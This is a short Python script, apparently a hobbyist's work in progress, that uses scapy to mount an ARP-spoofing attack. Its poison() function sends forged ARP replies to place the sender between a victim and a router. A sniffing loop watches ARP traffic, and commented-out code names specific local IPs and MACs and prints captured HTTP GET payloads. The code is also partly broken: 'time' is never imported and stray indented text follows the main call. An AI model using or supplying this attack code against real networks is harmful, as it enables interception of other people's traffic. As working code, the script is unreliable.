#!/usr/bin/python
# coding: utf-8

from scapy.all import*

## Create a Packet Count var
packetCount = 0

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
 
def ecoute():
	while 1:
		#poison('192.168.0.1','192.168.0.107','AC:F1:DF:64:30:FC','24:0A:64:63:BF:65')
		rep = sniff(filter="arp and host 192.168.0.111", timeout=2, count=10)
		time.sleep(1.5)
		rep.show()	
	
ecoute()


    """
        if http_packet.find('GET'):
                return GET_print(packet)
    """

"""
def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "*****************************************************************************************************\n"
    return ret
"""